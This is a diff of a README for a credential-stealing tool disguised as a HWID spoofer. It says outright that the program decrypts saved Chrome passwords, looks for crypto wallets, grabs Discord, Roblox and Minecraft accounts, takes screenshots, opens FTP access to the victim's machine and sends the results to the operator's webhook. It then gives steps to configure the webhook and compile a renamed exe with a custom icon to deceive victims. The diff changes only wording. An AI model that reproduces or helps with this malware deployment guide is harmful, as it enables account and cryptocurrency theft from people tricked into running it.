@@ -8,14 +8,13 @@
 ## What Does It Do?
 This is a malicious tool, aimed to look like a HWID Spoofer. The program finds the saved chrome details of the user and decrypts them. It also find out if; Exodus, Electrum, Metamask, Coinbase is installed on the system. It also gets the Minecraft SSID and player UUID. Once done so they are submitted to the Webhook selected by the owner. Furthermore it also opens up a FTP protocol on the users computer so you can directly access files you want to view.
 
-## What It Obtains
+## What It Obtains/Does
 - OS Data
 - Crypto Wallets
 - Minecraft SSID
 - Discord Account Grabber
 - Roblox Account Grabber
-- Chrome Saved Passwords <br>
-**Extras:** 
+- Chrome Saved Passwords
 - FTP Connection
 - Desktop Screenshot
 
@@ -23,27 +22,29 @@ This is a malicious tool, aimed to look like a HWID Spoofer. The program finds t
 
 1. **Download Python**: [Download Python](https://www.python.org/downloads/release/python-31012/)
 2. **Install Requirements**:
-    - Open Command Prompt in the project folder and run `pip install -r requirements.txt`.
+    - Open command prompt in the project folder and run `pip install -r requirements.txt`.
 3. **Create Your Webhook**:
     - Generate your Webhook URL/Token.
 4. **Set Up Webhook**:
-    - Place The Webhook Inside "" On Line 17
+    - Place the webhook inside "" On Line 17
 5. **Test It**:
-    - Run The File And Watch What Happends.
+    - Run the file and watch what happends.
 
-**Note:** I Would recommend changing the logo to something that suits what you plan to use this for, 
+**Note:** I would recommend changing the logo to something that suits what you plan to use this for, 
           to do the big ascii text similar to what i did visit [patorjk.com](https://patorjk.com/software/taag/#p=display&f=Graffiti&t=Spin)
 
 ## How To Compile
 
 1. **Run The build_exe.py** 
-    - And wait for it to fulyl complete.
+    - Open CMD in the folder where the project is.
+    - Run py build_exe.py
+    - And wait for it to fully complete.
 2. **Open The Dist Folder**
     - Thats where your exe will be
 3. **Changing Name**
-    -To change the name of the exe, open the build_exe.py and change line 10.
+    - To change the name of the exe, open the build_exe.py and change line 10.
 4. **Changing Icon**
-    -To change the icon of the exe, just replace the file named Icon.ico with what you desire. (Make sure its named Icon.ico)
+    - To change the icon of the exe, just replace the file named Icon.ico with what you desire. (Make sure its named Icon.ico)
 
 ## Dummy Log Images<br>
 
